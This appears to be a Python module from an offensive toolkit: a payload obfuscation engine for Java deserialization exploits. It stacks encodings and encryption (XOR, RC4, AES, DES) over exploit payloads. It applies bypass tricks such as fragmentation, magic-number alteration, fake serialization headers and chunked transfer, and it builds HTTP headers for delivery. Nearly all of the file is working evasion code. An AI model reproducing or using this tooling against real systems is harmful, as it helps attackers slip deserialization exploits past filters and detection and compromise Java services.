"""Payload obfuscation engine for Java deserialization exploitation.

Provides:
- Multi-layer encoding (Base64/Hex/URL/GZIP/Deflate)
- Encryption obfuscation (AES/DES/RC4)
- Bypass techniques (fragmentation, magic number obfuscation)
- Optimal encoding combination recommendation
"""

import asyncio
import base64
import gzip
import logging
import secrets
import struct
import time
import urllib.parse
import zlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class EncodingLayer(Enum):
    """Encoding layer types."""
    BASE64 = "base64"
    HEX = "hex"
    URL_ENCODE = "url_encode"
    GZIP = "gzip"
    DEFLATE = "deflate"


class EncryptionType(Enum):
    """Encryption algorithm types."""
    NONE = "none"
    AES = "aes"
    DES = "des"
    RC4 = "rc4"
    XOR = "xor"
    CUSTOM = "custom"


class BypassTechnique(Enum):
    """Payload bypass techniques."""
    FRAGMENTATION = "fragmentation"
    MAGIC_OBFUSCATION = "magic_obfuscation"
    LEGAL_WRAPPER = "legal_wrapper"
    CHUNKED_TRANSFER = "chunked_transfer"
    ENCODED_HEADER = "encoded_header"


@dataclass
class EncodingConfig:
    """Encoding configuration.

    Attributes:
        layers: Ordered list of encoding layers
        encryption: Encryption algorithm
        encryption_key: Encryption key (auto-generated if empty)
        bypass_techniques: List of bypass techniques
        max_chunk_size: Maximum chunk size for fragmentation
        custom_algorithm: Custom algorithm name (for CUSTOM encryption)
    """
    layers: List[EncodingLayer] = field(default_factory=lambda: [EncodingLayer.BASE64])
    encryption: EncryptionType = EncryptionType.NONE
    encryption_key: str = ""
    bypass_techniques: List[BypassTechnique] = field(default_factory=list)
    max_chunk_size: int = 1024
    custom_algorithm: str = ""


@dataclass
class ObfuscationResult:
    """Obfuscation result.

    Attributes:
        result_id: Unique result identifier
        original_size: Original payload size
        obfuscated_size: Obfuscated payload size
        size_ratio: Size ratio (obfuscated/original)
        encoded_data: Final encoded data
        encoding_chain: Applied encoding chain
        encryption_applied: Encryption type applied
        encryption_key: Encryption key used
        bypass_techniques: Applied bypass techniques
        chunks: Fragmented chunks (if fragmentation used)
        http_headers: Recommended HTTP headers
        mitre_technique: MITRE ATT&CK technique ID
        generation_time: Generation timestamp
        error_message: Error message if failed
    """
    result_id: str = ""
    original_size: int = 0
    obfuscated_size: int = 0
    size_ratio: float = 0.0
    encoded_data: str = ""
    encoding_chain: List[str] = field(default_factory=list)
    encryption_applied: EncryptionType = EncryptionType.NONE
    encryption_key: str = ""
    bypass_techniques: List[str] = field(default_factory=list)
    chunks: List[str] = field(default_factory=list)
    http_headers: Dict[str, str] = field(default_factory=dict)
    mitre_technique: str = "T1027"
    generation_time: float = 0.0
    error_message: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "result_id": self.result_id,
            "original_size": self.original_size,
            "obfuscated_size": self.obfuscated_size,
            "size_ratio": self.size_ratio,
            "encoding_chain": self.encoding_chain,
            "encryption_applied": self.encryption_applied.value,
            "bypass_techniques": self.bypass_techniques,
            "chunk_count": len(self.chunks),
            "http_headers": self.http_headers,
        }


class PayloadObfuscator:
    """Payload obfuscation engine.

    Provides multi-layer encoding, encryption obfuscation,
    and bypass techniques for Java deserialization payloads.
    """

    JAVA_SERIALIZATION_MAGIC = b"\xac\xed\x00\x05"

    MAGIC_VARIANTS: List[bytes] = [
        b"\xac\xed\x00\x05",  # Original
        b"\xac\xed\x00\x06",  # Modified version
        b"\x00\x05\xac\xed",  # Reversed
        b"\xed\xac\x05\x00",  # Fully reversed
        b"\xac\x00\xed\x05",  # Interleaved
    ]

    LEGAL_SERIALIZATION_HEADERS: List[bytes] = [
        b"\xac\xed\x00\x05\x70",  # TC_NULL
        b"\xac\xed\x00\x05\x72",  # TC_CLASSDESC
        b"\xac\xed\x00\x05\x73",  # TC_OBJECT
        b"\xac\xed\x00\x05\x74",  # TC_STRING
    ]

    def __init__(
        self,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize payload obfuscator.

        Args:
            event_bus: Event bus for broadcasting events.
        """
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._obfuscation_history: List[ObfuscationResult] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Obfuscator Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Obfuscator: %s", message)

    async def obfuscate_payload(
        self,
        payload: bytes,
        config: EncodingConfig,
    ) -> Optional[ObfuscationResult]:
        """Obfuscate payload with specified configuration.

        Args:
            payload: Original payload bytes.
            config: Encoding configuration.

        Returns:
            ObfuscationResult or None.
        """
        start_time = time.time()
        result = ObfuscationResult(
            result_id=f"obf_{int(time.time())}_{secrets.token_hex(4)}",
            original_size=len(payload),
            generation_time=time.time(),
        )

        try:
            await self._report_progress("开始混淆", 5)
            await self._report_log(f"原始Payload大小: {len(payload)} bytes")

            data = payload

            for i, layer in enumerate(config.layers):
                progress = 10 + (i / max(len(config.layers), 1)) * 40
                await self._report_progress(f"应用编码: {layer.value}", progress)
                data = await self._apply_encoding(data, layer)
                result.encoding_chain.append(layer.value)

            if config.encryption != EncryptionType.NONE:
                await self._report_progress("应用加密", 60)
                key = config.encryption_key or secrets.token_hex(16)
                data = await self._apply_encryption(data, config.encryption, key)
                result.encryption_applied = config.encryption
                result.encryption_key = key

            if BypassTechnique.FRAGMENTATION in config.bypass_techniques:
                await self._report_progress("分片处理", 75)
                chunks = self._fragment_payload(data, config.max_chunk_size)
                result.chunks = [
                    base64.b64encode(c).decode("utf-8") for c in chunks
                ]
                result.bypass_techniques.append("fragmentation")

            if BypassTechnique.MAGIC_OBFUSCATION in config.bypass_techniques:
                await self._report_progress("魔数混淆", 85)
                data = self._obfuscate_magic(data)
                result.bypass_techniques.append("magic_obfuscation")

            if BypassTechnique.LEGAL_WRAPPER in config.bypass_techniques:
                await self._report_progress("合法包装", 90)
                data = self._wrap_with_legal_header(data)
                result.bypass_techniques.append("legal_wrapper")

            result.encoded_data = base64.b64encode(data).decode("utf-8")
            result.obfuscated_size = len(data)
            result.size_ratio = result.obfuscated_size / max(result.original_size, 1)

            result.http_headers = self._generate_http_headers(config, result)

            await self._report_progress("完成", 100)
            await self._report_log(
                f"混淆完成: {result.original_size} -> {result.obfuscated_size} bytes "
                f"(ratio: {result.size_ratio:.2f})"
            )

            self._obfuscation_history.append(result)

        except Exception as e:
            result.error_message = str(e)
            await self._report_log(f"混淆失败: {e}")
            logger.error("Payload obfuscation failed: %s", e)

        return result

    async def _apply_encoding(
        self,
        data: bytes,
        layer: EncodingLayer,
    ) -> bytes:
        """Apply single encoding layer.

        Args:
            data: Input data.
            layer: Encoding layer type.

        Returns:
            Encoded data.
        """
        if layer == EncodingLayer.BASE64:
            return base64.b64encode(data)
        elif layer == EncodingLayer.HEX:
            return data.hex().encode("utf-8")
        elif layer == EncodingLayer.URL_ENCODE:
            return urllib.parse.quote(data, safe="").encode("utf-8")
        elif layer == EncodingLayer.GZIP:
            return gzip.compress(data)
        elif layer == EncodingLayer.DEFLATE:
            return zlib.compress(data)
        else:
            return data

    async def _apply_encryption(
        self,
        data: bytes,
        encryption: EncryptionType,
        key: str,
    ) -> bytes:
        """Apply encryption to data.

        Args:
            data: Input data.
            encryption: Encryption type.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        try:
            if encryption == EncryptionType.XOR:
                key_bytes = key.encode("utf-8")[:16]
                return bytes(
                    b ^ key_bytes[i % len(key_bytes)]
                    for i, b in enumerate(data)
                )
            elif encryption == EncryptionType.RC4:
                return self._rc4_encrypt(data, key.encode("utf-8"))
            elif encryption == EncryptionType.AES:
                return await self._aes_encrypt(data, key)
            elif encryption == EncryptionType.DES:
                return await self._des_encrypt(data, key)
            else:
                return data

        except Exception as e:
            logger.error("Encryption failed: %s", e)
            return data

    def _rc4_encrypt(self, data: bytes, key: bytes) -> bytes:
        """RC4 encryption.

        Args:
            data: Input data.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]

        i = 0
        j = 0
        output = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            K = S[(S[i] + S[j]) % 256]
            output.append(byte ^ K)

        return bytes(output)

    async def _aes_encrypt(self, data: bytes, key: str) -> bytes:
        """AES encryption.

        Args:
            data: Input data.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding

            key_bytes = key.encode("utf-8")[:32].ljust(32, b"\x00")
            iv = secrets.token_bytes(16)

            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()

            cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv))
            encryptor = cipher.encryptor()
            encrypted = encryptor.update(padded_data) + encryptor.finalize()

            return iv + encrypted

        except ImportError:
            logger.warning("cryptography library not available, using XOR fallback")
            return self._rc4_encrypt(data, key.encode("utf-8"))

    async def _des_encrypt(self, data: bytes, key: str) -> bytes:
        """DES encryption.

        Args:
            data: Input data.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

            key_bytes = key.encode("utf-8")[:8].ljust(8, b"\x00")
            iv = secrets.token_bytes(8)

            cipher = Cipher(algorithms.TripleDES(key_bytes * 3), modes.CBC(iv))
            encryptor = cipher.encryptor()

            padded = data + b"\x00" * (8 - len(data) % 8)
            encrypted = encryptor.update(padded) + encryptor.finalize()

            return iv + encrypted

        except ImportError:
            logger.warning("cryptography library not available, using XOR fallback")
            return self._rc4_encrypt(data, key.encode("utf-8"))

    def _fragment_payload(
        self,
        data: bytes,
        max_chunk_size: int,
    ) -> List[bytes]:
        """Fragment payload into chunks.

        Args:
            data: Input data.
            max_chunk_size: Maximum chunk size.

        Returns:
            List of data chunks.
        """
        chunks: List[bytes] = []
        for i in range(0, len(data), max_chunk_size):
            chunks.append(data[i : i + max_chunk_size])
        return chunks

    def _obfuscate_magic(self, data: bytes) -> bytes:
        """Obfuscate Java serialization magic number.

        Args:
            data: Input data.

        Returns:
            Data with obfuscated magic number.
        """
        if data[:4] == self.JAVA_SERIALIZATION_MAGIC:
            variant = secrets.choice(self.MAGIC_VARIANTS[1:])
            return variant + data[4:]
        return data

    def _wrap_with_legal_header(self, data: bytes) -> bytes:
        """Wrap payload with legal serialization header.

        Args:
            data: Input data.

        Returns:
            Wrapped data.
        """
        header = secrets.choice(self.LEGAL_SERIALIZATION_HEADERS)
        return header + data

    def _generate_http_headers(
        self,
        config: EncodingConfig,
        result: ObfuscationResult,
    ) -> Dict[str, str]:
        """Generate recommended HTTP headers.

        Args:
            config: Encoding configuration.
            result: Obfuscation result.

        Returns:
            Dictionary of HTTP headers.
        """
        headers: Dict[str, str] = {
            "Content-Type": "application/x-java-serialized-object",
            "Content-Length": str(result.obfuscated_size),
        }

        if BypassTechnique.CHUNKED_TRANSFER in config.bypass_techniques:
            headers["Transfer-Encoding"] = "chunked"
            del headers["Content-Length"]

        if BypassTechnique.ENCODED_HEADER in config.bypass_techniques:
            headers["Content-Encoding"] = "base64"

        if result.encryption_applied != EncryptionType.NONE:
            headers["X-Encryption"] = result.encryption_applied.value
            headers["X-Encryption-Key"] = result.encryption_key

        return headers

    async def recommend_optimal_encoding(
        self,
        payload: bytes,
        max_size: int = 8192,
    ) -> Optional[EncodingConfig]:
        """Recommend optimal encoding combination.

        Args:
            payload: Original payload.
            max_size: Maximum allowed size.

        Returns:
            Recommended encoding configuration.
        """
        try:
            await self._report_progress("分析最优编码", 10)

            original_size = len(payload)
            best_config: Optional[EncodingConfig] = None
            best_ratio = float("inf")

            encoding_combinations: List[List[EncodingLayer]] = [
                [EncodingLayer.BASE64],
                [EncodingLayer.GZIP, EncodingLayer.BASE64],
                [EncodingLayer.DEFLATE, EncodingLayer.BASE64],
                [EncodingLayer.GZIP, EncodingLayer.HEX],
                [EncodingLayer.BASE64, EncodingLayer.URL_ENCODE],
                [EncodingLayer.DEFLATE, EncodingLayer.BASE64, EncodingLayer.URL_ENCODE],
            ]

            for combo in encoding_combinations:
                config = EncodingConfig(layers=combo)
                result = await self.obfuscate_payload(payload, config)
                if result and result.obfuscated_size <= max_size:
                    ratio = result.size_ratio
                    if ratio < best_ratio:
                        best_ratio = ratio
                        best_config = config

            if best_config:
                await self._report_log(
                    f"推荐编码组合: {[l.value for l in best_config.layers]} "
                    f"(ratio: {best_ratio:.2f})"
                )

            return best_config

        except Exception as e:
            await self._report_log(f"编码推荐失败: {e}")
            logger.error("Encoding recommendation failed: %s", e)
            return None

    def get_obfuscation_history(self) -> List[ObfuscationResult]:
        """Get obfuscation history.

        Returns:
            List of obfuscation results.
        """
        return self._obfuscation_history

    def get_obfuscation_by_id(self, result_id: str) -> Optional[ObfuscationResult]:
        """Get obfuscation result by ID.

        Args:
            result_id: Result identifier.

        Returns:
            ObfuscationResult or None.
        """
        for result in self._obfuscation_history:
            if result.result_id == result_id:
                return result
        return None
